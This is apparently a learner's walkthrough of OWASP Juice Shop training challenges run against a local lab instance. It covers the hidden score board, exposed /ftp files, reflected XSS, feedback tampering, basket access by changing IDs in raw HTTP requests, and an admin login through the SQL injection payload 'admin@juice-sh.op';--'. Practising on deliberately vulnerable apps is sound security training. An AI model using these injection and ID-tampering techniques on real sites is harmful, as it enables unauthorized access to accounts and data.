# Creating an account and registering
Credentials used 
```text
username: abc@abc.com
password: abcdef
```
Emails harvested
```text
admin@juice-sh.op
bender@juice-sh.op
jim@juice-sh.op
```

# Level 0 challenges

## 01 Finding the score board
To find the score board, we can inspect the links of the page and we see that /score-board isn't linked yet. With this, when we visit 
http://IP_ADDRESS/score-board, we can solve the challenge
![Score Board](https://github.com/HanozDar/challenges/blob/master/owasp-js/images/score-board.png)

## 02 Finding a confidencial Document
To find a confidential document, we go to the Terms and Conditions in the about page. There, while reading the source code we see an interesting link.
![Finding Document](https://github.com/HanozDar/challenges/blob/master/owasp-js/images/finding-document-1.png)
Here we see an interesting link to download the ToS, /ftp. So we visit the site
This is what we get. 
![Finding Document 2](https://github.com/HanozDar/challenges/blob/master/owasp-js/images/finding-document-2.png)
Here, we see an acquisitions.md file and when we open it, we see this line 
```text
┌──(hanoz㉿kali)-[~/…/htb/challenges/owasp-js/images]
└─$ cat acquisitions.md            
# Planned Acquisitions

> This document is confidential! Do not distribute!
```
Thus, we have found it!

## 03 Finding an Instance of Improper error handling

When in /ftp, we see some other documents too, like gg files, bak files and yaml files. When we try to open these files, we see the following error. 
![Improper Error Handling](https://github.com/HanozDar/challenges/blob/master/owasp-js/images/improper-error-handling.png)

Here, it is just directly outputting the Node error, rather than sanitizing it, revealing some potentially dangerous information. 
Thus, this challenge is completed. 

## 04 Reading the Privacy Policy
This was a challenge similar to finding the scoreboard, we find a link with 
/privacy-security.
So we find the Privacy Policy in there and when we click on it, the challenge will appear solved.
```text
http://192.168.24.143:3000/#/privacy-security/privacy-policy
```

## 05 XSS Tier 1
Here, we simply find forms where we can input data. We see there is a search bar at the top of the page, so we go there and we input the parameter needed to get reflected XSS

![XSS Tier 1](https://github.com/HanozDar/challenges/blob/master/owasp-js/images/xss-tier-1.png)

Hence, the challenge is marked solved

## 06 Redirects Tier 1
We need to find a link that is redirecting us to another website. After scouring the website, I found something interesting in main.js
![Redirect crypto wallet](https://github.com/HanozDar/challenges/blob/master/owasp-js/images/redirect-crypto-wallets.png)

Now, lets go there
And the challenge is marked as solved!

## 07 0-star Feedback
This challenge is pretty straightforward, all you had to do is create a request and see how the form data was handled. There is a rating field in the post request, which we can directly set to zero in burp
![zero star rating](https://github.com/HanozDar/challenges/blob/master/owasp-js/images/0-star-rating.png)

## 08 Repitative Registration
The challenge asks us to check for the DRY principle. First let's see what it is
DRY - Don't repeat yourself in User Registration.
Cool, the only repeated field is the password.
To solve this, while typing in the original password, we repeat it for the confirm password. If the confirm password is the same as original password, it does not show the error of "passwords do not match". However, if we change the original password AFTER the confirm password "passwords do not match is removed", then there is no error. 
So we first need to match the passwords, then change the password, and we see that there is no error, and we are able to create an account. 
Hence, the challenge is marked solved. 

# Level 2 
## 01 Basket Access Tier 1
This challenge is straightforward. Our job is to just find the request in burpsuite where it is requesting for a user's basket. When we have logged in, so let's find it 
This is the request
```text
GET /rest/basket/5 HTTP/1.1
Host: 192.168.24.143:3000
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhYmNAYWJjLmNvbSIsInBhc3N3b3JkIjoiZTgwYjUwMTcwOTg5NTBmYzU4YWFkODNjOGMxNDk3OGUiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDEtMDggMDA6MjE6MTkuNzkyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDEtMDggMDA6MjE6MTkuNzkyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY0MTYwMTI5MCwiZXhwIjoxNjQxNjE5MjkwfQ.fOh5Hervpj1idtDmyE1tXI2suzBZt1yN5fwsEEqy4NYCE8WHMvRtCACiGHW_MuLT_4bAtq-2nUH1qtNumVgarJ7wKPfO0pputg_dBGuoC-nnHplE_FU5jMn4sLcHRTeJVGDh5Hw8WJ2Fck2zMDzHFAO3xgSrQvqSMp539pPPDPQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Referer: http://192.168.24.143:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=oZ9wBrRM43l7VxPnXQz1LW0NVHehqiau1yixB08pg6kbjKONJm2yDYaE5vqe; io=J8aXdQUF77aZTjggAAAE; welcome-banner-status=dismiss; cookieconsent_status=dismiss; token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhYmNAYWJjLmNvbSIsInBhc3N3b3JkIjoiZTgwYjUwMTcwOTg5NTBmYzU4YWFkODNjOGMxNDk3OGUiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDEtMDggMDA6MjE6MTkuNzkyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDEtMDggMDA6MjE6MTkuNzkyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY0MTYwMTI5MCwiZXhwIjoxNjQxNjE5MjkwfQ.fOh5Hervpj1idtDmyE1tXI2suzBZt1yN5fwsEEqy4NYCE8WHMvRtCACiGHW_MuLT_4bAtq-2nUH1qtNumVgarJ7wKPfO0pputg_dBGuoC-nnHplE_FU5jMn4sLcHRTeJVGDh5Hw8WJ2Fck2zMDzHFAO3xgSrQvqSMp539pPPDPQ
Connection: close
```
Now, we can see that we don't really need to know any user's ID, we can just change 5 to any random number and we will have another user's basket.
Let's try it 
```text
GET /rest/basket/1 HTTP/1.1
Host: 192.168.24.143:3000
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhYmNAYWJjLmNvbSIsInBhc3N3b3JkIjoiZTgwYjUwMTcwOTg5NTBmYzU4YWFkODNjOGMxNDk3OGUiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDEtMDggMDA6MjE6MTkuNzkyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDEtMDggMDA6MjE6MTkuNzkyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY0MTYwMTI5MCwiZXhwIjoxNjQxNjE5MjkwfQ.fOh5Hervpj1idtDmyE1tXI2suzBZt1yN5fwsEEqy4NYCE8WHMvRtCACiGHW_MuLT_4bAtq-2nUH1qtNumVgarJ7wKPfO0pputg_dBGuoC-nnHplE_FU5jMn4sLcHRTeJVGDh5Hw8WJ2Fck2zMDzHFAO3xgSrQvqSMp539pPPDPQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Referer: http://192.168.24.143:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=oZ9wBrRM43l7VxPnXQz1LW0NVHehqiau1yixB08pg6kbjKONJm2yDYaE5vqe; io=J8aXdQUF77aZTjggAAAE; welcome-banner-status=dismiss; cookieconsent_status=dismiss; token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhYmNAYWJjLmNvbSIsInBhc3N3b3JkIjoiZTgwYjUwMTcwOTg5NTBmYzU4YWFkODNjOGMxNDk3OGUiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDEtMDggMDA6MjE6MTkuNzkyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDEtMDggMDA6MjE6MTkuNzkyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY0MTYwMTI5MCwiZXhwIjoxNjQxNjE5MjkwfQ.fOh5Hervpj1idtDmyE1tXI2suzBZt1yN5fwsEEqy4NYCE8WHMvRtCACiGHW_MuLT_4bAtq-2nUH1qtNumVgarJ7wKPfO0pputg_dBGuoC-nnHplE_FU5jMn4sLcHRTeJVGDh5Hw8WJ2Fck2zMDzHFAO3xgSrQvqSMp539pPPDPQ
Connection: close
```

And we have success!
![Another Basket](https://github.com/HanozDar/challenges/blob/master/owasp-js/images/another-basket.png)

## 02 Login Admin
It's pretty easy, when you learn that the login form is vulnerable to SQL injection
If you put ' in the username and any random thing in password
you get this at the top of the page
```text
[object Object]
```

Error not gracefully handled, so let's construct a payload for logging into admin
```text
admin@juice-sh.op';--
```

Cool! We have logged in!

